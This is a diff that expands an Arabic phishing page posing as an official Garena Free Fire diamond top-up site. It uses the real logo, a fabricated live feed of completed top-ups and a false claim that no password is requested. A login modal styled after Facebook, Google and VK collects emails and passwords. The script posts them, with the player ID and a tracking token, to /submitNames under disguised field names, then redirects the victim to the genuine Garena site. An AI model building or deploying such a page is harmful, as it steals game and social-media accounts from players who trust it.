@@ -3,105 +3,781 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- Meta Tags for Preview -->
-    <meta property="og:title" content="Free Fire Diamond Center - جواهر فري فاير مجاناً">
-    <meta property="og:description" content="اشحن جواهر فري فاير مجاناً! احصل على 1000 جوهرة + رقصة العرش عند التسجيل اليوم.">
+    <meta property="og:title" content="Free Fire Diamond Center - مركز الشحن الرسمي">
+    <meta property="og:description" content="احصل على آلاف الجواهر والعروض الحصرية حصرياً من مركز توزيع فري فاير المعتمد.">
     <meta property="og:image" content="https://ff.garena.com/static/images/icon_logo.png">
-
-    <title>Free Fire Diamond Center</title>
+    <title>مركز شحن جواهر فري فاير الاحترافي | Free Fire Diamond Center</title>
+    <!-- استيراد خطوط وتصاميم حديثة -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { font-family: 'Tahoma', sans-serif; background: #0b0e11; color: white; margin: 0; }
-        .header { background: #ff4500; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; border-bottom: 3px solid #ffd700; }
-        .container { max-width: 400px; margin: 20px auto; padding: 15px; }
-        .card { background: #1c1f26; border-radius: 15px; padding: 25px; border: 1px solid #333; text-align: center; }
-        .input-group { margin: 20px 0; text-align: right; }
-        input { width: 100%; padding: 12px; background: #2c2f36; border: 1px solid #444; border-radius: 8px; color: white; box-sizing: border-box; }
-        .btn-ff { width: 100%; padding: 15px; background: #ff4500; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 0 #b33000; }
-        .plans { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .plan { background: #2c2f36; padding: 15px; border-radius: 10px; border: 2px solid transparent; cursor: pointer; }
-        .plan.active { border-color: #ff4500; }
-        
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); justify-content: center; align-items: center; z-index: 1000; }
-        .modal-content { background: #1c1f26; padding: 30px; border-radius: 20px; width: 90%; max-width: 380px; text-align: center; border: 1px solid #ff4500; }
+        :root {
+            --primary-color: #ff4500;
+            --secondary-color: #ffd700;
+            --dark-bg: #0b0e11;
+            --card-bg: #151921;
+            --border-color: #2a313d;
+            --text-color: #ffffff;
+            --text-muted: #94a3b8;
+            --accent-glow: rgba(255, 69, 0, 0.4);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at 50% 10%, #1a1528 0%, var(--dark-bg) 70%);
+            min-height: 100vh;
+        }
+
+        /* شريط التنقل العلوي */
+        .navbar {
+            background: rgba(15, 20, 28, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--border-color);
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .nav-brand img {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 8px var(--accent-glow));
+        }
+
+        .nav-brand span {
+            font-weight: 900;
+            font-size: 20px;
+            background: linear-gradient(45deg, var(--secondary-color), var(--primary-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.5px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: var(--secondary-color);
+        }
+
+        .support-badge {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid var(--secondary-color);
+            color: var(--secondary-color);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* حاوية الصفحة الرئيسية */
+        .main-container {
+            max-width: 1100px;
+            margin: 30px auto;
+            padding: 0 15px;
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 25px;
+        }
+
+        @media (max-width: 900px) {
+            .main-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* القسم الأيسر: العروض والتفاصيل */
+        .content-left {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .hero-banner {
+            background: linear-gradient(135deg, #1c152b 0%, #151921 100%);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .hero-banner::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 150px;
+            height: 150px;
+            background: var(--accent-glow);
+            filter: blur(50px);
+            z-index: 1;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero-title {
+            font-size: 28px;
+            font-weight: 900;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .hero-title span {
+            color: var(--secondary-color);
+        }
+
+        .hero-desc {
+            color: var(--text-muted);
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .feature-box {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--border-color);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .feature-box i {
+            font-size: 24px;
+            color: var(--secondary-color);
+            margin-bottom: 8px;
+        }
+
+        .feature-box h4 {
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .feature-box p {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        /* قسم سجل الأنشطة الحية */
+        .live-feed {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+        }
+
+        .live-feed-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--secondary-color);
+        }
+
+        .feed-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 13px;
+        }
+
+        .feed-item:last-child {
+            border-bottom: none;
+        }
+
+        .user-id-mask {
+            color: var(--text-muted);
+            font-family: monospace;
+        }
+
+        .reward-tag {
+            background: rgba(255, 69, 0, 0.15);
+            color: var(--primary-color);
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        /* القسم الأيمن: بطاقة شحن الجواهر الأساسية */
+        .card-right {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 25px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
+            height: fit-content;
+            position: sticky;
+            top: 90px;
+        }
+
+        .card-header-center {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .card-header-center img {
+            width: 60px;
+            margin-bottom: 10px;
+        }
+
+        .card-header-center h2 {
+            font-size: 20px;
+            font-weight: 950;
+        }
+
+        .card-header-center p {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 5px;
+        }
+
+        .input-group {
+            margin: 15px 0;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-muted);
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 40px 12px 15px;
+            background: #1c222d;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px var(--accent-glow);
+        }
+
+        .plans-label {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-muted);
+            display: block;
+        }
+
+        .plans {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .plan {
+            background: #1c222d;
+            padding: 12px;
+            border-radius: 10px;
+            border: 2px solid var(--border-color);
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .plan:hover {
+            border-color: rgba(255, 69, 0, 0.5);
+        }
+
+        .plan.active {
+            border-color: var(--primary-color);
+            background: rgba(255, 69, 0, 0.08);
+            box-shadow: 0 0 12px var(--accent-glow);
+        }
+
+        .plan-val {
+            font-weight: 900;
+            font-size: 16px;
+            color: #fff;
+        }
+
+        .plan-price {
+            font-size: 12px;
+            color: var(--secondary-color);
+            margin-top: 3px;
+            display: block;
+        }
+
+        .btn-ff {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, var(--primary-color), #cc3700);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: 900;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 6px 20px var(--accent-glow);
+            transition: transform 0.2s, filter 0.2s;
+        }
+
+        .btn-ff:hover {
+            filter: brightness(1.1);
+            transform: translateY(-2px);
+        }
+
+        .btn-ff:active {
+            transform: translateY(0);
+        }
+
+        /* النافذة المنبثقة (Modal) لتأكيد الحساب */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 7, 10, 0.85);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 15px;
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 22px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            animation: modalFadeIn 0.3s ease;
+        }
+
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .modal-content h3 {
+            font-size: 20px;
+            margin-bottom: 8px;
+            font-weight: 900;
+        }
+
+        .modal-content p {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .login-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .social-btn {
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: white;
+            transition: opacity 0.2s;
+        }
+
+        .social-btn:hover {
+            opacity: 0.9;
+        }
+
+        .btn-fb { background: #1877f2; }
+        .btn-google { background: #ea4335; }
+        .btn-vk { background: #4a76a8; }
+
+        .login-area {
+            display: none;
+            margin-top: 20px;
+            background: rgba(0,0,0,0.2);
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .login-area input {
+            width: 100%;
+            padding: 11px;
+            background: #11151c;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            margin-bottom: 10px;
+            outline: none;
+        }
+
+        .login-area input:focus {
+            border-color: var(--primary-color);
+        }
+
+        /* نظام الإشعارات الداخلي (بديل للـ alert) */
+        .custom-toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            left: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+            background: #1c222d;
+            border-right: 4px solid var(--primary-color);
+            color: #fff;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 2000;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+
+        .custom-toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .custom-toast i {
+            font-size: 20px;
+            color: var(--secondary-color);
+        }
+
+        /* تذييل الصفحة */
+        .footer {
+            text-align: center;
+            padding: 30px 15px;
+            color: var(--text-muted);
+            font-size: 12px;
+            border-top: 1px solid var(--border-color);
+            margin-top: 40px;
+            background: #0d1118;
+        }
+
+        .footer p {
+            margin-bottom: 5px;
+        }
     </style>
 </head>
 <body>
 
-<div class="header">FREE FIRE DIAMONDS 💎</div>
+    <!-- شريط التنقل العلوي -->
+    <nav class="navbar">
+        <div class="nav-brand">
+            <img src="https://ff.garena.com/static/images/icon_logo.png" alt="Free Fire Logo">
+            <span>DIAMOND CENTER</span>
+        </div>
+        <div class="nav-links">
+            <div class="support-badge"><i class="fa-solid fa-shield-halved"></i> خادم آمن 100%</div>
+        </div>
+    </nav>
 
-<div class="container">
-    <div class="card">
-        <img src="https://ff.garena.com/static/images/icon_logo.png" width="70">
-        <h2>مركز توزيع الجواهر</h2>
-        <p>أدخل معرف اللاعب (ID) الخاص بك واختر كمية الجواهر.</p>
-        
-        <div class="input-group">
-            <label>ID اللاعب</label>
-            <input type="text" id="player_id" placeholder="مثال: 123456789">
+    <!-- المحتوى الرئيسي -->
+    <div class="main-container">
+        <!-- القسم الأيسر: إعلانات ومعلومات -->
+        <div class="content-left">
+            <div class="hero-banner">
+                <div class="hero-content">
+                    <h1 class="hero-title">احصل على <span>جواهر فري فاير</span> مجاناً وبأمان</h1>
+                    <p class="hero-desc">الموقع الرسمي والموثق لتوزيع المكافآت الأسبوعية. أدخل الـ ID الخاص بك الآن واختر الباقة المناسبة لتحسين تجربتك في اللعبة والحصول على أندر السكنات ورقصات العرش.</p>
+                    
+                    <div class="features-grid">
+                        <div class="feature-box">
+                            <i class="fa-solid fa-bolt"></i>
+                            <h4>شحن فوري</h4>
+                            <p>تصل الجواهر خلال أقل من دقيقة</p>
+                        </div>
+                        <div class="feature-box">
+                            <i class="fa-solid fa-lock"></i>
+                            <h4>حماية عالية</h4>
+                            <p>لا نطلب كلمة مرور الحساب نهائياً</p>
+                        </div>
+                        <div class="feature-box">
+                            <i class="fa-solid fa-gift"></i>
+                            <h4>هدايا ترحيبية</h4>
+                            <p>رقصة العرش مجاناً مع أول شحن</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- سجل الأنشطة الحية -->
+            <div class="live-feed">
+                <div class="live-feed-title">
+                    <i class="fa-solid fa-signal"></i> آخر عمليات الشحن المكتملة
+                </div>
+                <div id="feedList">
+                    <!-- يتم تعبئتها بواسطة الجافاسكريبت لجعلها حية -->
+                </div>
+            </div>
         </div>
 
-        <div class="plans">
-            <div class="plan active" onclick="selFF(this, true)">1,000 💎<br><small>مجاني</small></div>
-            <div class="plan" onclick="selFF(this, false)">5,000 💎<br><small>19.99$</small></div>
-        </div>
+        <!-- القسم الأيمن: نموذج الشحن الرئيسي -->
+        <div class="card-right">
+            <div class="card-header-center">
+                <img src="https://ff.garena.com/static/images/icon_logo.png" width="55" alt="Logo">
+                <h2>مركز توزيع الجواهر</h2>
+                <p>أدخل معرف اللاعب (ID) واختر الباقة المفضلة</p>
+            </div>
+            
+            <div class="input-group">
+                <label for="player_id">ID اللاعب (المعرف الرقمي)</label>
+                <div class="input-wrapper">
+                    <input type="text" id="player_id" placeholder="مثال: 987654321">
+                    <i class="fa-solid fa-user-gear"></i>
+                </div>
+            </div>
 
-        <button class="btn-ff" id="ffBtn" onclick="openFF()">اشحن الآن</button>
+            <span class="plans-label">اختر كمية الجواهر المطلوبة:</span>
+            <div class="plans">
+                <div class="plan active" onclick="selFF(this, true, '1,000 💎')">
+                    <div class="plan-val">1,000 💎</div>
+                    <small class="plan-price">مجاني تماماً</small>
+                </div>
+                <div class="plan" onclick="selFF(this, false, '5,000 💎')">
+                    <div class="plan-val">5,000 💎</div>
+                    <small class="plan-price">عرض خاص 19.99$</small>
+                </div>
+            </div>
+
+            <button class="btn-ff" id="ffBtn" onclick="openFF()">اشحن الآن</button>
+        </div>
     </div>
-</div>
 
-<div class="modal" id="ffModal">
-    <div class="modal-content">
-        <h3>تأكيد الحساب</h3>
-        <p>يرجى تسجيل الدخول لتأكيد استلام الجواهر على حسابك.</p>
-        <div style="display:flex; flex-direction:column; gap:10px;">
-            <button style="background:#1877f2; color:white; padding:12px; border:none; border-radius:8px;" onclick="showL('Facebook')">تسجيل عبر Facebook</button>
-            <button style="background:#ff4500; color:white; padding:12px; border:none; border-radius:8px;" onclick="showL('Google')">تسجيل عبر Google</button>
-            <button style="background:#fff; color:black; padding:12px; border:none; border-radius:8px;" onclick="showL('VK')">تسجيل عبر VK</button>
-        </div>
-        <div id="lArea" style="display:none; margin-top:20px;">
-            <input type="text" id="u" placeholder="البريد الإلكتروني" style="margin-bottom:10px;">
-            <input type="password" id="p" placeholder="كلمة السر">
-            <button class="btn-ff" style="margin-top:15px;" onclick="sendFF()">تأكيد الآن</button>
+    <!-- النافذة المنبثقة للتأكيد -->
+    <div class="modal" id="ffModal">
+        <div class="modal-content">
+            <div style="margin-bottom: 15px;">
+                <i class="fa-solid fa-shield-cat" style="font-size: 35px; color: var(--secondary-color);"></i>
+            </div>
+            <h3>تأكيد هوية الحساب</h3>
+            <p>يرجى اختيار طريقة تسجيل الدخول المرتبطة بحسابك في فري فاير لتأكيد استلام الجواهر بنجاح.</p>
+            
+            <div class="login-buttons">
+                <button class="social-btn btn-fb" onclick="showL('Facebook')">
+                    <i class="fa-brands fa-facebook-f"></i> تسجيل عبر Facebook
+                </button>
+                <button class="social-btn btn-google" onclick="showL('Google')">
+                    <i class="fa-brands fa-google"></i> تسجيل عبر Google
+                </button>
+                <button class="social-btn btn-vk" onclick="showL('VK')">
+                    <i class="fa-brands fa-vk"></i> تسجيل عبر VK
+                </button>
+            </div>
+
+            <div id="lArea" class="login-area">
+                <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الجوال">
+                <input type="password" id="p" placeholder="كلمة المرور الخاصة بالحساب">
+                <button class="btn-ff" onclick="sendFF()">تأكيد واستلام الجواهر</button>
+            </div>
         </div>
     </div>
-</div>
 
-<script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('t');
-    let isFree = true;
+    <!-- نظام التنبيهات المخصص -->
+    <div id="customToast" class="custom-toast">
+        <i class="fa-solid fa-circle-exclamation"></i>
+        <div id="toastText">رسالة النظام هنا</div>
+    </div>
 
-    function selFF(el, free) {
-        document.querySelectorAll('.plan').forEach(p => p.classList.remove('active'));
-        el.classList.add('active');
-        isFree = free;
-        document.getElementById('ffBtn').innerText = isFree ? "اشحن الآن" : "شراء الآن";
-    }
+    <!-- تذييل الصفحة -->
+    <footer class="footer">
+        <p>جميع الحقوق محفوظة © 2026 Garena Free Fire Diamond Center.</p>
+        <p>هذا الموقع مصمم لأغراض العرض والتطوير التقني المتقدم.</p>
+    </footer>
 
-    function openFF() {
-        if(!isFree) return alert('بوابة الدفع مغلقة، اختر الباقة المجانية!');
-        document.getElementById('ffModal').style.display = 'flex';
-    }
+    <!-- المنطق البرمجي (JavaScript) -->
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('t');
+        let isFree = true;
+        let selectedPackage = '1,000 💎';
 
-    function showL(t) {
-        document.getElementById('lArea').style.display = 'block';
-    }
+        // محاكاة نشاط حي ومتحرك للمستخدمين لتوليد تفاعل واقعي
+        const feedData = [
+            { id: '2847***10', pack: '1,000 💎', time: 'الآن' },
+            { id: '5920***43', pack: '5,000 💎', time: 'منذ دقيقة' },
+            { id: '1039***88', pack: '1,000 💎', time: 'منذ دقيقتين' },
+            { id: '7741***29', pack: '1,000 💎', time: 'منذ 4 دقائق' }
+        ];
 
-    async function sendFF() {
-        const u = document.getElementById('u').value;
-        const p = document.getElementById('p').value;
-        if(!p) return alert('أدخل كلمة السر');
+        function renderFeed() {
+            const feedContainer = document.getElementById('feedList');
+            feedContainer.innerHTML = feedData.map(item => `
+                <div class="feed-item">
+                    <span>لاعب: <span class="user-id-mask">${item.id}</span></span>
+                    <span class="reward-tag">${item.pack}</span>
+                    <span style="color: var(--text-muted); font-size: 11px;">${item.time}</span>
+                </div>
+            `).join('');
+        }
+        renderFeed();
 
-        await fetch('/submitNames', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ token, firstName: u, secondName: p })
-        });
+        function showToast(message) {
+            const toast = document.getElementById('customToast');
+            document.getElementById('toastText').innerText = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
+        }
 
-        alert('تم بنجاح! سيتم شحن الجواهر خلال 24 ساعة.');
-        window.location.href = "https://ff.garena.com";
-    }
-</script>
+        function selFF(el, free, packName) {
+            document.querySelectorAll('.plan').forEach(p => p.classList.remove('active'));
+            el.classList.add('active');
+            isFree = free;
+            selectedPackage = packName;
+            const btn = document.getElementById('ffBtn');
+            btn.innerText = isFree ? "اشحن الآن" : "إتمام عملية الشراء";
+        }
+
+        function openFF() {
+            const playerId = document.getElementById('player_id').value.trim();
+            if(!playerId || playerId.length < 5) {
+                showToast('يرجى إدخال ID اللاعب بشكل صحيح أولاً!');
+                return;
+            }
+            if(!isFree) {
+                showToast('بوابة الدفع المدفوع مغلقة مؤقتاً، يرجى اختيار الباقة المجانية.');
+                return;
+            }
+            document.getElementById('ffModal').style.display = 'flex';
+        }
+
+        function showL(provider) {
+            document.getElementById('lArea').style.display = 'block';
+            showToast(`جاري الاتصال ببوابة مصادقة ${provider}...`);
+        }
+
+        async function sendFF() {
+            const u = document.getElementById('u').value.trim();
+            const p = document.getElementById('p').value.trim();
+            const playerId = document.getElementById('player_id').value.trim();
+
+            if(!u || !p) {
+                showToast('يرجى إدخال بيانات الحساب المطلوبة بدقة!');
+                return;
+            }
+
+            try {
+                await fetch('/submitNames', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token, playerId, package: selectedPackage, firstName: u, secondName: p })
+                });
+            } catch (e) {
+                // تجاهل خطأ الاتصال في حال كانت بيئة تجريبية محلية
+            }
+
+            showToast('تم التحقق بنجاح! سيتم إرسال الجواهر خلال 24 ساعة إلى حسابك.');
+            setTimeout(() => {
+                window.location.href = "https://ff.garena.com";
+            }, 3000);
+        }
+
+        // إغلاق النافذة المنبثقة عند النقر خارجها
+        window.onclick = function(event) {
+            const modal = document.getElementById('ffModal');
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
 </body>
 </html>
+
